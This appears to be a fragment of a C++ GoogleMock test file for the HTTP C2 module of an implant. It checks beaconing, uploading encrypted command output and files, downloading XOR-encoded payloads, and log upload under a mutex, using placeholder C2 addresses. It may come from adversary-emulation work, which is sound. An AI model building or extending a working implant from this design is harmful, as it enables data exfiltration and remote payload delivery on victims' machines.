    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(_)).Times(0);
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1)
        .WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::PerformBeacon(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, mock_implant_id, NULL), dummy_error);
}

TEST_F(CommsHttpTest, TestUploadCommandOutputSuccess) {
    LPVOID resp_buf;
    LPVOID status_buf;
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"POST"),
        StrEq(dummy_command_output_url),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        BufferContentEq(encrypted_dummy_command_output, DUMMY_COMMAND_OUTPUT_LEN),
        DUMMY_COMMAND_OUTPUT_LEN
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&resp_buf),
            Invoke([&resp_buf]() { std::memcpy(resp_buf, mock_response_data, 1); }),
            SetArgPointee<3>(1),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::UploadCommandOutput(&mock_api_wrapper, dummy_c2_address, dummy_c2_port, v_dummy_command_output, dummy_cmd_id), ERROR_SUCCESS);
}

TEST_F(CommsHttpTest, TestDownloadPayloadBytes) {
    LPVOID mock_buf;
    LPVOID status_buf;

	EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"GET"),
        StrEq(dummy_payload_url),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        NULL,
        0
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    {
        InSequence s;
        EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
            mock_h_request,
            _,
            RESP_BUFFER_SIZE,
            _
        )).Times(3)
            .WillRepeatedly(DoAll(
                SaveArg<1>(&mock_buf),
                Invoke([&mock_buf]() { std::memset(mock_buf, 67, RESP_BUFFER_SIZE); }),
                SetArgPointee<3>(RESP_BUFFER_SIZE),
                Return(TRUE)));
        EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
            mock_h_request,
            _,
            RESP_BUFFER_SIZE,
            _
        )).Times(1)
            .WillOnce(DoAll(
                SetArgPointee<3>(0),
                Return(TRUE)));
    }

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet)).Times(1).WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session)).Times(1).WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request)).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillRepeatedly(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    DWORD result;
    std::vector<char> payload_bytes = comms_http::DownloadPayloadBytes(
        &mock_api_wrapper,
        dummy_c2_address, 
        dummy_c2_port, 
        dummy_cmd_id,
        &result
    );
    ASSERT_EQ(result, ERROR_SUCCESS);
    ASSERT_EQ(std::vector<unsigned char>(payload_bytes.begin(), payload_bytes.end()), v_xored_dummy_payload_contents);
}

TEST_F(CommsHttpTest, TestUploadFileSuccess) {
    LPVOID mock_file_buf;
    LPVOID resp_buf;
    LPVOID status_buf;
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, CreateFileWrapper(
        StrEq(DUMMY_OUTPUT_FILE_PATH1),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    )).Times(1).WillOnce(Return(h_mock_output_file1));

    EXPECT_CALL(mock_api_wrapper, GetFileSizeWrapper(
        h_mock_output_file1, 
        NULL
    )).Times(1).WillOnce(Return(OUTPUT_FILE_SIZE1));

    EXPECT_CALL(mock_api_wrapper, ReadFileWrapper(
        h_mock_output_file1, 
        _,
        _,
        _, 
        NULL
    )).Times(2).WillOnce(DoAll(
        SaveArg<1>(&mock_file_buf),
        [&mock_file_buf]() { std::memset(mock_file_buf, 65, 2500); }, // fill with "A"
        SetArgPointee<3>(2500),
        Return(TRUE)
    )).WillOnce(DoAll(
        [&mock_file_buf]() { std::memset((char*)mock_file_buf + 2500, 65, OUTPUT_FILE_SIZE1 - 2500); }, // fill with "A"
        SetArgPointee<3>(OUTPUT_FILE_SIZE1 - 2500),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, CloseHandleWrapper(h_mock_output_file1)).Times(1);

    EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"POST"),
        StrEq(OUTPUT_FILE_POST_PATH1),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        BufferContentEq(encrypted_file_contents, OUTPUT_FILE_SIZE1),
        OUTPUT_FILE_SIZE1
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&resp_buf),
            Invoke([&resp_buf]() { std::memcpy(resp_buf, mock_response_data, 1); }),
            SetArgPointee<3>(1),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::UploadFile(
        &mock_api_wrapper, 
        dummy_c2_address, 
        dummy_c2_port, 
        DUMMY_OUTPUT_FILE_PATH1,
        L"1234",
        TRUE
    ), ERROR_SUCCESS);
}

TEST_F(CommsHttpTest, TestUploadAndTruncateLogFileWithMutexSuccess) {
    LPVOID mock_file_buf;
    LPVOID resp_buf;
    LPVOID status_buf;
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, WaitForSingleObjectWrapper(h_dummy_mutex, MUTEX_WAIT_MS))
        .Times(1).WillOnce(Return(WAIT_OBJECT_0));

    EXPECT_CALL(mock_api_wrapper, CreateFileWrapper(
        StrEq(DUMMY_OUTPUT_FILE_PATH1),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    )).Times(1).WillOnce(Return(h_mock_output_file1));

    EXPECT_CALL(mock_api_wrapper, GetFileSizeWrapper(
        h_mock_output_file1, 
        NULL
    )).Times(1).WillOnce(Return(OUTPUT_FILE_SIZE1));

    EXPECT_CALL(mock_api_wrapper, ReadFileWrapper(
        h_mock_output_file1, 
        _,
        _,
        _, 
        NULL
    )).Times(2).WillOnce(DoAll(
        SaveArg<1>(&mock_file_buf),
        [&mock_file_buf]() { std::memset(mock_file_buf, 65, 2500); }, // fill with "A"
        SetArgPointee<3>(2500),
        Return(TRUE)
    )).WillOnce(DoAll(
        [&mock_file_buf]() { std::memset((char*)mock_file_buf + 2500, 65, OUTPUT_FILE_SIZE1 - 2500); }, // fill with "A"
        SetArgPointee<3>(OUTPUT_FILE_SIZE1 - 2500),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, CloseHandleWrapper(h_mock_output_file1)).Times(1);

    EXPECT_CALL(mock_api_wrapper, InternetOpenWrapper(
        StrEq(DEFAULT_USER_AGENT),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, 
        NULL,
        0
    )).Times(1).WillOnce(Return(mock_h_inet));

    EXPECT_CALL(mock_api_wrapper, InternetConnectWrapper(
        mock_h_inet,
        StrEq(dummy_c2_address),
        dummy_c2_port,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_session));

    EXPECT_CALL(mock_api_wrapper, HttpOpenRequestWrapper(
        mock_h_session,
        StrEq(L"POST"),
        StrEq(OUTPUT_FILE_POST_PATH1),
        NULL,
        NULL,
        AcceptTypesEq(dummy_accept_types, 2),
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        (DWORD_PTR)NULL
    )).Times(1).WillOnce(Return(mock_h_request));

    EXPECT_CALL(mock_api_wrapper, HttpSendRequestWrapper(
        mock_h_request,
        NULL,
        -1L,
        BufferContentEq(encrypted_file_contents, OUTPUT_FILE_SIZE1),
        OUTPUT_FILE_SIZE1
    )).Times(1).WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, HttpQueryInfoWrapper(
        mock_h_request,
        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        _,
        _,
        NULL
    )).Times(1).WillOnce(DoAll(
        SaveArg<2>(&status_buf),
        Invoke([&status_buf]() { std::memcpy(status_buf, &status_ok, sizeof(DWORD)); }),
        SetArgPointee<3>(sizeof(DWORD)),
        Return(TRUE)
    ));

    EXPECT_CALL(mock_api_wrapper, InternetReadFileWrapper(
        mock_h_request,
        _,
        RESP_BUFFER_SIZE,
        _
    )).Times(2)
        .WillOnce(DoAll(
            SaveArg<1>(&resp_buf),
            Invoke([&resp_buf]() { std::memcpy(resp_buf, mock_response_data, 1); }),
            SetArgPointee<3>(1),
            Return(TRUE)))
        .WillOnce(DoAll(
            SetArgPointee<3>(0),
            Return(TRUE)));

    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_inet))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_session))
        .Times(1)
        .WillOnce(Return(TRUE));
    EXPECT_CALL(mock_api_wrapper, InternetCloseHandleWrapper(mock_h_request))
        .Times(1)
        .WillOnce(Return(TRUE));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    EXPECT_CALL(mock_api_wrapper, ReleaseMutexWrapper(h_dummy_mutex))
        .Times(1).WillOnce(Return(TRUE));

    ASSERT_EQ(comms_http::UploadAndTruncateLogWithMutex(
        &mock_api_wrapper, 
        dummy_c2_address, 
        dummy_c2_port, 
        DUMMY_OUTPUT_FILE_PATH1,
        L"1234",
        TRUE,
        h_dummy_mutex
    ), ERROR_SUCCESS);
}

TEST_F(CommsHttpTest, TestUploadAndTruncateLogFileWithMutexFailWait) {
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, WaitForSingleObjectWrapper(h_dummy_mutex, MUTEX_WAIT_MS))
        .Times(1).WillOnce(Return(WAIT_FAILED));
    
    EXPECT_CALL(mock_api_wrapper, GetLastErrorWrapper())
        .Times(1).WillOnce(Return(dummy_error));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::UploadAndTruncateLogWithMutex(
        &mock_api_wrapper, 
        dummy_c2_address, 
        dummy_c2_port, 
        DUMMY_OUTPUT_FILE_PATH1,
        L"1234",
        TRUE,
        h_dummy_mutex
    ), dummy_error);
}

TEST_F(CommsHttpTest, TestUploadAndTruncateLogFileWithMutexFailTimeout) {
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, WaitForSingleObjectWrapper(h_dummy_mutex, MUTEX_WAIT_MS))
        .Times(1).WillOnce(Return(WAIT_TIMEOUT));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::UploadAndTruncateLogWithMutex(
        &mock_api_wrapper, 
        dummy_c2_address, 
        dummy_c2_port, 
        DUMMY_OUTPUT_FILE_PATH1,
        L"1234",
        TRUE,
        h_dummy_mutex
    ), FAIL_MUTEX_TIMEOUT);
}

TEST_F(CommsHttpTest, TestUploadAndTruncateLogFileWithMutexFailAbandoned) {
    InSequence s;

    EXPECT_CALL(mock_api_wrapper, WaitForSingleObjectWrapper(h_dummy_mutex, MUTEX_WAIT_MS))
        .Times(1).WillOnce(Return(WAIT_ABANDONED));

    EXPECT_CALL(mock_api_wrapper, CurrentUtcTimeWrapper()).Times(1).WillOnce(Return(mock_timestamp));
    EXPECT_CALL(mock_api_wrapper, AppendStringWrapper(StrEq(logging::kC2LogFile), _)).Times(1);

    ASSERT_EQ(comms_http::UploadAndTruncateLogWithMutex(
        &mock_api_wrapper, 
        dummy_c2_address, 
        dummy_c2_port, 
        DUMMY_OUTPUT_FILE_PATH1,
        L"1234",
        TRUE,
        h_dummy_mutex
    ), FAIL_MUTEX_ABANDONED);
}

TEST_F(CommsHttpTest, TestUpdateUserAgent) {
    std::wstring new_agent = L"new user agent";
    EXPECT_THAT(comms_http::user_agent, StrEq(DEFAULT_USER_AGENT));
    comms_http::UpdateUserAgent(new_agent);
    EXPECT_THAT(comms_http::user_agent, StrEq(new_agent));
    comms_http::UpdateUserAgent(L"");
    EXPECT_THAT(comms_http::user_agent, StrEq(new_agent));
}